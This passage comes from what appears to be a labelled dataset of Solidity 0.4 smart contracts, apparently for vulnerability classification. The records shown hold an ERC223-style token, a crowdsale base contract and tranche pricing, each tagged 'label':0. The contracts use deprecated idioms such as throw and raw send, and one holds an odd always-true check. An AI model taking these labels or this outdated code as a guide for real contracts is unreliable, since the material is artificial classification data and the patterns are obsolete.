throw;\r\r\n            } else {\r\r\n                \/\/ too much, send only acceptable value, return rest\r\r\n                if (!intermediate.send(upLimit))\r\r\n                    throw;\r\r\n                if (!msg.sender.send(msg.value - upLimit))\r\r\n                    throw;\r\r\n            }\r\r\n        } else {\r\r\n            \/\/ always return value from CLASSIC chain\r\r\n            if (!msg.sender.send(msg.value))\r\r\n                throw;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function setIntermediate(address _intermediate) {\r\r\n        if (msg.sender != owner) throw;\r\r\n        intermediate = _intermediate;\r\r\n    }\r\r\n    function setUpLimit(uint _limit) {\r\r\n        if (msg.sender != owner) throw;\r\r\n        upLimit = _limit;\r\r\n    }\r\r\n    function setLowLimit(uint _limit) {\r\r\n        if (msg.sender != owner) throw;\r\r\n        lowLimit = _limit;\r\r\n    }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.11;\r\r\n \r\r\ncontract ContractReceiver {\r\r\n     \r\r\n    struct TKN {\r\r\n        address sender;\r\r\n        uint value;\r\r\n        bytes data;\r\r\n        bytes4 sig;\r\r\n    }\r\r\n   \r\r\n   \r\r\n    function tokenFallback(address _from, uint _value, bytes _data){\r\r\n      TKN memory tkn;\r\r\n      tkn.sender = _from;\r\r\n      tkn.value = _value;\r\r\n      tkn.data = _data;\r\r\n      uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24);\r\r\n      tkn.sig = bytes4(u);\r\r\n \r\r\n    }\r\r\n}\r\r\n \r\r\ncontract SafeMath {\r\r\n    uint256 constant public MAX_UINT256 =\r\r\n    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;\r\r\n \r\r\n    function safeAdd(uint256 x, uint256 y) constant internal returns (uint256 z) {\r\r\n        if (x > MAX_UINT256 - y) throw;\r\r\n        return x + y;\r\r\n    }\r\r\n \r\r\n    function safeSub(uint256 x, uint256 y) constant internal returns (uint256 z) {\r\r\n        if (x < y) throw;\r\r\n        return x - y;\r\r\n    }\r\r\n \r\r\n    function safeMul(uint256 x, uint256 y) constant internal returns (uint256 z) {\r\r\n        if (y == 0) return 0;\r\r\n        if (x > MAX_UINT256 \/ y) throw;\r\r\n        return x * y;\r\r\n    }\r\r\n}\r\r\n \r\r\ncontract Token is SafeMath{\r\r\n \r\r\n  mapping(address => uint) balances;\r\r\n \r\r\n  string public symbol = \"\";\r\r\n  string public name = \"\";\r\r\n  uint8 public decimals = 18;\r\r\n  uint256 public totalSupply = 0;\r\r\n  address owner = 0;\r\r\n  bool setupDone = false;\r\r\n \r\r\n  event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);\r\r\n \r\r\n  function Token(address adr) {\r\r\n        owner = adr;        \r\r\n    }\r\r\n   \r\r\n    function SetupToken(string _tokenName, string _tokenSymbol, uint256 _tokenSupply)\r\r\n    {\r\r\n        if (msg.sender == owner && setupDone == false)\r\r\n        {\r\r\n            symbol = _tokenSymbol;\r\r\n            name = _tokenName;\r\r\n            totalSupply = _tokenSupply * 1000000000000000000;\r\r\n            balances[owner] = totalSupply;\r\r\n            setupDone = true;\r\r\n        }\r\r\n    }\r\r\n \r\r\n  function name() constant returns (string _name) {\r\r\n      return name;\r\r\n  }\r\r\n \r\r\n  function symbol() constant returns (string _symbol) {\r\r\n      return symbol;\r\r\n  }\r\r\n \r\r\n  function decimals() constant returns (uint8 _decimals) {\r\r\n      return decimals;\r\r\n  }\r\r\n \r\r\n  function totalSupply() constant returns (uint256 _totalSupply) {\r\r\n      return totalSupply;\r\r\n  }\r\r\n \r\r\n  function transfer(address _to, uint _value, bytes _data) returns (bool success) {\r\r\n     \r\r\n    if(isContract(_to)) {\r\r\n        return transferToContract(_to, _value, _data);\r\r\n    }\r\r\n    else {\r\r\n        return transferToAddress(_to, _value, _data);\r\r\n    }\r\r\n}\r\r\n \r\r\n  function transfer(address _to, uint _value) returns (bool success) {\r\r\n     \r\r\n    bytes memory empty;\r\r\n    if(isContract(_to)) {\r\r\n        return transferToContract(_to, _value, empty);\r\r\n    }\r\r\n    else {\r\r\n        return transferToAddress(_to, _value, empty);\r\r\n    }\r\r\n}\r\r\n \r\r\n  function isContract(address _addr) private returns (bool is_contract) {\r\r\n      uint length;\r\r\n     \r\r\n      if (balanceOf(_addr) >=0 )\r\r\n     \r\r\n      assembly {\r\r\n            length := extcodesize(_addr)\r\r\n        }\r\r\n        if(length>0) {\r\r\n            return true;\r\r\n        }\r\r\n        else {\r\r\n            return false;\r\r\n        }\r\r\n    }\r\r\n \r\r\n  function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {\r\r\n    if (balanceOf(msg.sender) < _value) throw;\r\r\n    balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);\r\r\n    balances[_to] = safeAdd(balanceOf(_to), _value);\r\r\n    Transfer(msg.sender, _to, _value, _data);\r\r\n    return true;\r\r\n  }\r\r\n \r\r\n  function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {\r\r\n    if (balanceOf(msg.sender) < _value) throw;\r\r\n    balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);\r\r\n    balances[_to] = safeAdd(balanceOf(_to), _value);\r\r\n    ContractReceiver reciever = ContractReceiver(_to);\r\r\n    reciever.tokenFallback(msg.sender, _value, _data);\r\r\n    Transfer(msg.sender, _to, _value, _data);\r\r\n    return true;\r\r\n}\r\r\n \r\r\n  function balanceOf(address _owner) constant returns (uint balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n}","label":0}
{"code":"\/**\r\r\n * Interface for defining crowdsale pricing.\r\r\n *\/\r\r\ncontract PricingStrategy {\r\r\n\r\r\n  \/** Interface declaration. *\/\r\r\n  function isPricingStrategy() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/** Self check if all references are correctly set.\r\r\n   *\r\r\n   * Checks that pricing strategy matches crowdsale parameters.\r\r\n   *\/\r\r\n  function isSane(address crowdsale) public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * When somebody tries to buy tokens for X eth, calculate how many tokens they get.\r\r\n   *\r\r\n   *\r\r\n   * @param value - What is the value of the transaction send in as wei\r\r\n   * @param tokensSold - how much tokens have been sold this far\r\r\n   * @param weiRaised - how much money has been raised this far\r\r\n   * @param msgSender - who is the investor of this transaction\r\r\n   * @param decimals - how many decimal units the token has\r\r\n   * @return Amount of tokens the investor receives\r\r\n   *\/\r\r\n  function calculatePrice(uint value, uint tokensSold, uint weiRaised, address msgSender, uint decimals) public constant returns (uint tokenAmount);\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Safe unsigned safe math.\r\r\n *\r\r\n * https:\/\/blog.aragon.one\/library-driven-development-in-solidity-2bebcaf88736#.750gwtwli\r\r\n *\r\r\n * Originally from https:\/\/raw.githubusercontent.com\/AragonOne\/zeppelin-solidity\/master\/contracts\/SafeMathLib.sol\r\r\n *\r\r\n * Maintained here until merged to mainline zeppelin-solidity.\r\r\n *\r\r\n *\/\r\r\nlibrary SafeMathLib {\r\r\n\r\r\n  function times(uint a, uint b) returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function minus(uint a, uint b) returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function plus(uint a, uint b) returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a && c>=b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) private {\r\r\n    if (!assertion) throw;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * Ownable\r\r\n *\r\r\n * Base contract with an owner.\r\r\n * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  modifier onlyOwner() {\r\r\n    if (msg.sender != owner) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/*\r\r\n * Haltable\r\r\n *\r\r\n * Abstract contract that allows children to implement an\r\r\n * emergency stop mechanism. Differs from Pausable by causing a throw when in halt mode.\r\r\n *\r\r\n *\r\r\n * Originally envisioned in FirstBlood ICO contract.\r\r\n *\/\r\r\ncontract Haltable is Ownable {\r\r\n  bool public halted;\r\r\n\r\r\n  modifier stopInEmergency {\r\r\n    if (halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  modifier onlyInEmergency {\r\r\n    if (!halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on emergency, triggers stopped state\r\r\n  function halt() external onlyOwner {\r\r\n    halted = true;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on end of emergency, returns to normal state\r\r\n  function unhalt() external onlyOwner onlyInEmergency {\r\r\n    halted = false;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Finalize agent defines what happens at the end of succeseful crowdsale.\r\r\n *\r\r\n * - Allocate tokens for founders, bounties and community\r\r\n * - Make tokens transferable\r\r\n * - etc.\r\r\n *\/\r\r\ncontract FinalizeAgent {\r\r\n\r\r\n  function isFinalizeAgent() public constant returns(bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/** Return true if we can run finalizeCrowdsale() properly.\r\r\n   *\r\r\n   * This is a safety check function that doesn&#39;t allow crowdsale to begin\r\r\n   * unless the finalizer has been set up properly.\r\r\n   *\/\r\r\n  function isSane() public constant returns (bool);\r\r\n\r\r\n  \/** Called once by crowdsale finalize() if the sale was success. *\/\r\r\n  function finalizeCrowdsale();\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * ERC20 interface\r\r\n * see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n\r\r\n  function transfer(address to, uint value) returns (bool ok);\r\r\n  function transferFrom(address from, address to, uint value) returns (bool ok);\r\r\n  function approve(address spender, uint value) returns (bool ok);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token that defines fractional units as decimals.\r\r\n *\/\r\r\ncontract FractionalERC20 is ERC20 {\r\r\n\r\r\n  uint public decimals;\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Abstract base contract for token sales.\r\r\n *\r\r\n * Handle\r\r\n * - start and end dates\r\r\n * - accepting investments\r\r\n * - minimum funding goal and refund\r\r\n * - various statistics during the crowdfund\r\r\n * - different pricing strategies\r\r\n * - different investment policies (require server side customer id, allow only whitelisted addresses)\r\r\n *\r\r\n *\/\r\r\ncontract Crowdsale is Haltable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  \/* The token we are selling *\/\r\r\n  FractionalERC20 public token;\r\r\n\r\r\n  \/* How we are going to price our offering *\/\r\r\n  PricingStrategy public pricingStrategy;\r\r\n\r\r\n  \/* Post-success callback *\/\r\r\n  FinalizeAgent public finalizeAgent;\r\r\n\r\r\n  \/* tokens will be transfered from this address *\/\r\r\n  address public multisigWallet;\r\r\n\r\r\n  \/* if the funding goal is not reached, investors may withdraw their funds *\/\r\r\n  uint public minimumFundingGoal;\r\r\n\r\r\n  \/* the UNIX timestamp start date of the crowdsale *\/\r\r\n  uint public startsAt;\r\r\n\r\r\n  \/* the UNIX timestamp end date of the crowdsale *\/\r\r\n  uint public endsAt;\r\r\n\r\r\n  \/* the number of tokens already sold through this contract*\/\r\r\n  uint public tokensSold = 0;\r\r\n\r\r\n  \/* How many wei of funding we have raised *\/\r\r\n  uint public weiRaised = 0;\r\r\n\r\r\n  \/* How many distinct addresses have invested *\/\r\r\n  uint public investorCount = 0;\r\r\n\r\r\n  \/* How much wei we have returned back to the contract after a failed crowdfund. *\/\r\r\n  uint public loadedRefund = 0;\r\r\n\r\r\n  \/* How much wei we have given back to investors.*\/\r\r\n  uint public weiRefunded = 0;\r\r\n\r\r\n  \/* Has this crowdsale been finalized *\/\r\r\n  bool public finalized;\r\r\n\r\r\n  \/* Do we need to have unique contributor id for each customer *\/\r\r\n  bool public requireCustomerId;\r\r\n\r\r\n  \/**\r\r\n    * Do we verify that contributor has been cleared on the server side (accredited investors only).\r\r\n    * This method was first used in FirstBlood crowdsale to ensure all contributors have accepted terms on sale (on the web).\r\r\n    *\/\r\r\n  bool public requiredSignedAddress;\r\r\n\r\r\n  \/* Server side address that signed allowed contributors (Ethereum addresses) that can participate the crowdsale *\/\r\r\n  address public signerAddress;\r\r\n\r\r\n  \/** How much ETH each address has invested to this crowdsale *\/\r\r\n  mapping (address => uint256) public investedAmountOf;\r\r\n\r\r\n  \/** How much tokens this crowdsale has credited for each investor address *\/\r\r\n  mapping (address => uint256) public tokenAmountOf;\r\r\n\r\r\n  \/** Addresses that are allowed to invest even before ICO offical opens. For testing, for ICO partners, etc. *\/\r\r\n  mapping (address => bool) public earlyParticipantWhitelist;\r\r\n\r\r\n  \/** This is for manul testing for the interaction from owner wallet. You can set it to any value and inspect this in blockchain explorer to see that crowdsale interaction works. *\/\r\r\n  uint public ownerTestValue;\r\r\n\r\r\n  \/** State machine\r\r\n   *\r\r\n   * - Preparing: All contract initialization calls and variables have not been set yet\r\r\n   * - Prefunding: We have not passed start time yet\r\r\n   * - Funding: Active crowdsale\r\r\n   * - Success: Minimum funding goal reached\r\r\n   * - Failure: Minimum funding goal not reached before ending time\r\r\n   * - Finalized: The finalized has been called and succesfully executed\r\r\n   * - Refunding: Refunds are loaded on the contract for reclaim.\r\r\n   *\/\r\r\n  enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\r\r\n\r\r\n  \/\/ A new investment was made\r\r\n  event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\r\r\n\r\r\n  \/\/ Refund was processed for a contributor\r\r\n  event Refund(address investor, uint weiAmount);\r\r\n\r\r\n  \/\/ The rules were changed what kind of investments we accept\r\r\n  event InvestmentPolicyChanged(bool requireCustomerId, bool requiredSignedAddress, address signerAddress);\r\r\n\r\r\n  \/\/ Address early participation whitelist status changed\r\r\n  event Whitelisted(address addr, bool status);\r\r\n\r\r\n  \/\/ Crowdsale end time has been changed\r\r\n  event EndsAtChanged(uint endsAt);\r\r\n\r\r\n  function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\r\r\n\r\r\n    owner = msg.sender;\r\r\n\r\r\n    token = FractionalERC20(_token);\r\r\n\r\r\n    setPricingStrategy(_pricingStrategy);\r\r\n\r\r\n    multisigWallet = _multisigWallet;\r\r\n    if(multisigWallet == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    if(_start == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    startsAt = _start;\r\r\n\r\r\n    if(_end == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    endsAt = _end;\r\r\n\r\r\n    \/\/ Don&#39;t mess the dates\r\r\n    if(startsAt >= endsAt) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Minimum funding goal can be zero\r\r\n    minimumFundingGoal = _minimumFundingGoal;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Don&#39;t expect to just send in money and get tokens.\r\r\n   *\/\r\r\n  function() payable {\r\r\n    throw;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Make an investment.\r\r\n   *\r\r\n   * Crowdsale must be running for one to invest.\r\r\n   * We must have not pressed the emergency brake.\r\r\n   *\r\r\n   * @param receiver The Ethereum address who receives the tokens\r\r\n   * @param customerId (optional) UUID v4 to track the successful payments on the server side\r\r\n   *\r\r\n   *\/\r\r\n  function investInternal(address receiver, uint128 customerId) stopInEmergency private {\r\r\n\r\r\n    \/\/ Determine if it&#39;s a good time to accept investment from this participant\r\r\n    if(getState() == State.PreFunding) {\r\r\n      \/\/ Are we whitelisted for early deposit\r\r\n      if(!earlyParticipantWhitelist[receiver]) {\r\r\n        throw;\r\r\n      }\r\r\n    } else if(getState() == State.Funding) {\r\r\n      \/\/ Retail participants can only come in when the crowdsale is running\r\r\n      \/\/ pass\r\r\n    } else {\r\r\n      \/\/ Unwanted state\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    uint weiAmount = msg.value;\r\r\n    uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\r\r\n\r\r\n    if(tokenAmount == 0) {\r\r\n      \/\/ Dust transaction\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    if(investedAmountOf[receiver] == 0) {\r\r\n       \/\/ A new investor\r\r\n       investorCount++;\r\r\n    }\r\r\n\r\r\n    \/\/ Update investor\r\r\n    investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\r\r\n    tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\r\r\n\r\r\n    \/\/ Update totals\r\r\n    weiRaised = weiRaised.plus(weiAmount);\r\r\n    tokensSold = tokensSold.plus(tokenAmount);\r\r\n\r\r\n    \/\/ Check that we did not bust the cap\r\r\n    if(isBreakingCap(tokenAmount, weiAmount, weiRaised, tokensSold)) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    assignTokens(receiver, tokenAmount);\r\r\n\r\r\n    \/\/ Pocket the money\r\r\n    if(!multisigWallet.send(weiAmount)) throw;\r\r\n\r\r\n    \/\/ Tell us invest was success\r\r\n    Invested(receiver, weiAmount, tokenAmount, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Preallocate tokens for the early investors.\r\r\n   *\r\r\n   * Preallocated tokens have been sold before the actual crowdsale opens.\r\r\n   * This function mints the tokens and moves the crowdsale needle.\r\r\n   *\r\r\n   * Investor count is not handled; it is assumed this goes for multiple investors\r\r\n   * and the token distribution happens outside the smart contract flow.\r\r\n   *\r\r\n   * No money is exchanged, as the crowdsale team already have received the payment.\r\r\n   *\r\r\n   * @param fullTokens tokens as full tokens - decimal places added internally\r\r\n   * @param weiPrice Price of a single full token in wei\r\r\n   *\r\r\n   *\/\r\r\n  function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner {\r\r\n\r\r\n    uint tokenAmount = fullTokens * 10**token.decimals();\r\r\n    uint weiAmount = weiPrice * tokenAmount; \/\/ This can be also 0, we give out tokens for free\r\r\n\r\r\n    weiRaised = weiRaised.plus(weiAmount);\r\r\n    tokensSold = tokensSold.plus(tokenAmount);\r\r\n\r\r\n    investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\r\r\n    tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\r\r\n\r\r\n    assignTokens(receiver, tokenAmount);\r\r\n\r\r\n    \/\/ Tell us invest was success\r\r\n    Invested(receiver, weiAmount, tokenAmount, 0);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow anonymous contributions to this crowdsale.\r\r\n   *\/\r\r\n  function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\r\r\n     bytes32 hash = sha256(addr);\r\r\n     if (ecrecover(hash, v, r, s) != signerAddress) throw;\r\r\n     if(customerId == 0) throw;  \/\/ UUIDv4 sanity check\r\r\n     investInternal(addr, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Track who is the customer making the payment so we can send thank you email.\r\r\n   *\/\r\r\n  function investWithCustomerId(address addr, uint128 customerId) public payable {\r\r\n    if(requiredSignedAddress) throw; \/\/ Crowdsale allows only server-side signed participants\r\r\n    if(customerId == 0) throw;  \/\/ UUIDv4 sanity check\r\r\n    investInternal(addr, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow anonymous contributions to this crowdsale.\r\r\n   *\/\r\r\n  function invest(address addr) public payable {\r\r\n    if(requireCustomerId) throw; \/\/ Crowdsale needs to track partipants for thank you email\r\r\n    if(requiredSignedAddress) throw; \/\/ Crowdsale allows only server-side signed participants\r\r\n    investInternal(addr, 0);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Invest to tokens, recognize the payer and clear his address.\r\r\n   *\r\r\n   *\/\r\r\n  function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\r\r\n    investWithSignedAddress(msg.sender, customerId, v, r, s);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Invest to tokens, recognize the payer.\r\r\n   *\r\r\n   *\/\r\r\n  function buyWithCustomerId(uint128 customerId) public payable {\r\r\n    investWithCustomerId(msg.sender, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * The basic entry point to participate the crowdsale process.\r\r\n   *\r\r\n   * Pay for funding, get invested tokens back in the sender address.\r\r\n   *\/\r\r\n  function buy() public payable {\r\r\n    invest(msg.sender);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Finalize a succcesful crowdsale.\r\r\n   *\r\r\n   * The owner can triggre a call the contract that provides post-crowdsale actions, like releasing the tokens.\r\r\n   *\/\r\r\n  function finalize() public inState(State.Success) onlyOwner stopInEmergency {\r\r\n\r\r\n    \/\/ Already finalized\r\r\n    if(finalized) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Finalizing is optional. We only call it if we are given a finalizing agent.\r\r\n    if(address(finalizeAgent) != 0) {\r\r\n      finalizeAgent.finalizeCrowdsale();\r\r\n    }\r\r\n\r\r\n    finalized = true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to (re)set finalize agent.\r\r\n   *\r\r\n   * Design choice: no state restrictions on setting this, so that we can fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\r\r\n    finalizeAgent = addr;\r\r\n\r\r\n    \/\/ Don&#39;t allow setting bad agent\r\r\n    if(!finalizeAgent.isFinalizeAgent()) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set policy do we need to have server-side customer ids for the investments.\r\r\n   *\r\r\n   *\/\r\r\n  function setRequireCustomerId(bool value) onlyOwner {\r\r\n    requireCustomerId = value;\r\r\n    InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set policy if all investors must be cleared on the server side first.\r\r\n   *\r\r\n   * This is e.g. for the accredited investor clearing.\r\r\n   *\r\r\n   *\/\r\r\n  function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\r\r\n    requiredSignedAddress = value;\r\r\n    signerAddress = _signerAddress;\r\r\n    InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow addresses to do early participation.\r\r\n   *\r\r\n   * TODO: Fix spelling error in the name\r\r\n   *\/\r\r\n  function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\r\r\n    earlyParticipantWhitelist[addr] = status;\r\r\n    Whitelisted(addr, status);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow crowdsale owner to close early or extend the crowdsale.\r\r\n   *\r\r\n   * This is useful e.g. for a manual soft cap implementation:\r\r\n   * - after X amount is reached determine manual closing\r\r\n   *\r\r\n   * This may put the crowdsale to an invalid state,\r\r\n   * but we trust owners know what they are doing.\r\r\n   *\r\r\n   *\/\r\r\n  function setEndsAt(uint time) onlyOwner {\r\r\n\r\r\n    if(now > time) {\r\r\n      throw; \/\/ Don&#39;t change past\r\r\n    }\r\r\n\r\r\n    endsAt = time;\r\r\n    EndsAtChanged(endsAt);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to (re)set pricing strategy.\r\r\n   *\r\r\n   * Design choice: no state restrictions on the set, so that we can fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\r\r\n    pricingStrategy = _pricingStrategy;\r\r\n\r\r\n    \/\/ Don&#39;t allow setting bad agent\r\r\n    if(!pricingStrategy.isPricingStrategy()) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow load refunds back on the contract for the refunding.\r\r\n   *\r\r\n   * The team can transfer the funds back on the smart contract in the case the minimum goal was not reached..\r\r\n   *\/\r\r\n  function loadRefund() public payable inState(State.Failure) {\r\r\n    if(msg.value == 0) throw;\r\r\n    loadedRefund = loadedRefund.plus(msg.value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Investors can claim refund.\r\r\n   *\/\r\r\n  function refund() public inState(State.Refunding) {\r\r\n    uint256 weiValue = investedAmountOf[msg.sender];\r\r\n    if (weiValue == 0) throw;\r\r\n    investedAmountOf[msg.sender] = 0;\r\r\n    weiRefunded = weiRefunded.plus(weiValue);\r\r\n    Refund(msg.sender, weiValue);\r\r\n    if (!msg.sender.send(weiValue)) throw;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @return true if the crowdsale has raised enough money to be a succes\r\r\n   *\/\r\r\n  function isMinimumGoalReached() public constant returns (bool reached) {\r\r\n    return weiRaised >= minimumFundingGoal;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Crowdfund state machine management.\r\r\n   *\r\r\n   * We make it a function and do not assign the result to a variable, so there is no chance of the variable being stale.\r\r\n   *\/\r\r\n  function getState() public constant returns (State) {\r\r\n    if(finalized) return State.Finalized;\r\r\n    else if (address(finalizeAgent) == 0) return State.Preparing;\r\r\n    else if (!finalizeAgent.isSane()) return State.Preparing;\r\r\n    else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\r\r\n    else if (block.timestamp < startsAt) return State.PreFunding;\r\r\n    else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\r\r\n    else if (isMinimumGoalReached()) return State.Success;\r\r\n    else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\r\r\n    else return State.Failure;\r\r\n  }\r\r\n\r\r\n  \/** This is for manual testing of multisig wallet interaction *\/\r\r\n  function setOwnerTestValue(uint val) onlyOwner {\r\r\n    ownerTestValue = val;\r\r\n  }\r\r\n\r\r\n  \/\/\r\r\n  \/\/ Modifiers\r\r\n  \/\/\r\r\n\r\r\n  \/** Modified allowing execution only if the crowdsale is currently running.  *\/\r\r\n  modifier inState(State state) {\r\r\n    if(getState() != state) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/\/\r\r\n  \/\/ Abstract functions\r\r\n  \/\/\r\r\n\r\r\n  \/**\r\r\n   * Check if the current invested breaks our cap rules.\r\r\n   *\r\r\n   *\r\r\n   * The child contract must define their own cap setting rules.\r\r\n   * We allow a lot of flexibility through different capping strategies (ETH, token count)\r\r\n   * Called from invest().\r\r\n   *\r\r\n   * @param weiAmount The amount of wei the investor tries to invest in the current transaction\r\r\n   * @param tokenAmount The amount of tokens we try to give to the investor in the current transaction\r\r\n   * @param weiRaisedTotal What would be our total raised balance after this transaction\r\r\n   * @param tokensSoldTotal What would be our total sold tokens count after this transaction\r\r\n   *\r\r\n   * @return true if taking this investment would break our cap rules\r\r\n   *\/\r\r\n  function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\r\r\n\r\r\n  \/**\r\r\n   * Check if the current crowdsale is full and we can no longer sell any tokens.\r\r\n   *\/\r\r\n  function isCrowdsaleFull() public constant returns (bool);\r\r\n\r\r\n  \/**\r\r\n   * Create new tokens or transfer issued tokens to the investor depending on the cap model.\r\r\n   *\/\r\r\n  function assignTokens(address receiver, uint tokenAmount) private;\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/\/\/ @dev Tranche based pricing with special support for pre-ico deals.\r\r\n\/\/\/      Implementing \"first price\" tranches, meaning, that if byers order is\r\r\n\/\/\/      covering more than one tranche, the price of the lowest tranche will apply\r\r\n\/\/\/      to the whole order.\r\r\ncontract EthTranchePricing is PricingStrategy, Ownable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  uint public constant MAX_TRANCHES = 10;\r\r\n\r\r\n  \/\/ This contains all pre-ICO addresses, and their prices (weis per token)\r\r\n  mapping (address => uint) public preicoAddresses;\r\r\n\r\r\n  \/**\r\r\n  * Define pricing schedule using tranches.\r\r\n  *\/\r\r\n  struct Tranche {\r\r\n\r\r\n      \/\/ Amount in weis when this tranche becomes active\r\r\n      uint amount;\r\r\n\r\r\n      \/\/ How many tokens per satoshi you will get while this tranche is active\r\r\n      uint price;\r\r\n  }\r\r\n\r\r\n  \/\/ Store tranches in a fixed array, so that it can be seen in a blockchain explorer\r\r\n  \/\/ Tranche 0 is always (0, 0)\r\r\n  \/\/ (TODO: change this when we confirm dynamic arrays are explorable)\r\r\n  Tranche[10] public tranches;\r\r\n\r\r\n  \/\/ How 